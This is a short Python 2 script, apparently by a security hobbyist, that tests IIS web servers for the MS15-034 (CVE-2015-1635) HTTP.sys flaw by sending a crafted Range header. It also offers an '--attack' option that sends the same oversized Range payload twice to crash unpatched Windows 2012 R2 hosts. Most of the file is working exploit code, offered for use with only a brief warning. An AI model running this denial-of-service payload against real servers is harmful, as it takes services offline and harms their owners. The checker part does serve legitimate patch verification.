#!/usr/bin/python

# Quick and dirty check for (CVE-2015-1635) MS15-034 + DoS attack option by wiredaemon(). Twitter:@wiredaemon v0.1
# Checks server response 'Requested Range Not Satisfiable' = vulnerable vs  'Request has an invalid header' =patched.
# Any other server responses are inconclusive. Be mindful that this does not necessarily mean that is not vulnerable.  
# Refer to for more info: http://blog.erratasec.com/2015/04/masscanning-for-ms15-034.html#.VS_mQxd_hmV
# DoS Attack option seem to work only in unpatched Windows 2012 R2. reference: http://pastebin.com/wWGFFZpG 
# Please use this feature responsible on your own PoC Env!! else face the consequences.
# Note: no https support just yet. WIP.


import sys
import socket
from optparse import OptionParser

options = OptionParser(usage='%prog server [options]', description='Test for MS15-034')
options.add_option('-p', '--port', type='int', default=80, help='TCP port to test (default: 80)')
options.add_option('--attack', action ="store_true", default=False, help='Send evil payload (works only in Win 2012)')

opts, args = options.parse_args()
if len(args) < 1:
	sys.exit(options.print_help())

host=args[0]
port=opts.port
	
Ipayload="GET /iis-85.png HTTP/1.0\r\n\r\n"
Mpayload="GET /iis-85.png HTTP/1.1\r\nHost: thaur\r\nRange: bytes=18-18446744073709551615\r\n\r\n"
Bpayload="GET / HTTP/1.1\r\nHost: thaur\r\nRange: bytes=0-18446744073709551615\r\n\r\n"


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print 'Connecting...'
s.connect((host,port))


if opts.attack==1:
	print 'Sending evil payload!'
	s.send(Mpayload)
	s.send(Mpayload)
	sys.exit('Done!')
else:
    print 'Sending payload...'
    s.send(Bpayload)
response = s.recv(1024)

if '416 Requested Range Not Satisfiable' in response:
  print (host + ' appears ###Vulnerable###!! \n\r')
elif 'The request has an invalid header' in response:
  print (host + ' does not appear to be Vulnerable! \n\r')
else: 
	print('Unexpected server response!. COULD NOT be determined is target is vulneable. \n\r' )

print response 
s.close